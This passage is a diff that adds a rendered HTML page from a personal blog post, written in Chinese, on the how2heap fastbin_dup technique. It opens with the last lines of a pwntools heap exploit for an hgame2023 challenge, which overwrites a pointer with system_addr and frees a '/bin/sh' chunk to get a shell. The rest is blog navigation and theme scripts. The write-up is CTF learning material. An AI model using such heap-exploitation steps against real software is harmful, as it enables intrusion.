class="line"><span class="built_in">add</span>(9,0x20,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(10,0x20,p64(system_addr))</span><br><span class="line"><span class="built_in">add</span>(11,0x10,b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(11)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/how2heap/" rel="tag"># how2heap</a>
+              <a href="/tags/fastbin-dup/" rel="tag"># fastbin_dup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/22/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/" rel="prev" title="2.24-2.35堆相关源码阅读笔记">
+      <i class="fa fa-chevron-left"></i> 2.24-2.35堆相关源码阅读笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%A3%80%E6%9F%A5%EF%BC%88%E6%89%80%E7%94%A8%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC2-23%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">相关检查（所用源码版本2.23）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-23-2-25"><span class="nav-number">2.1.</span> <span class="nav-text">2.23-2.25</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-27-2-33"><span class="nav-number">2.2.</span> <span class="nav-text">2.27-2.33</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-34%E4%BB%A5%E4%B8%8A"><span class="nav-number">2.3.</span> <span class="nav-text">2.34以上</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hgame2023-week2-fast-note"><span class="nav-number">3.1.</span> <span class="nav-text">hgame2023 week2 fast_note</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#realloc%E8%B0%83%E8%8A%82%E6%A0%88%E5%86%85%E5%AE%B9"><span class="nav-number">3.1.2.</span> <span class="nav-text">realloc调节栈内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">3.1.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hgame2023-week2-new-fast-note"><span class="nav-number">3.2.</span> <span class="nav-text">hgame2023 week2 new_fast_note</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
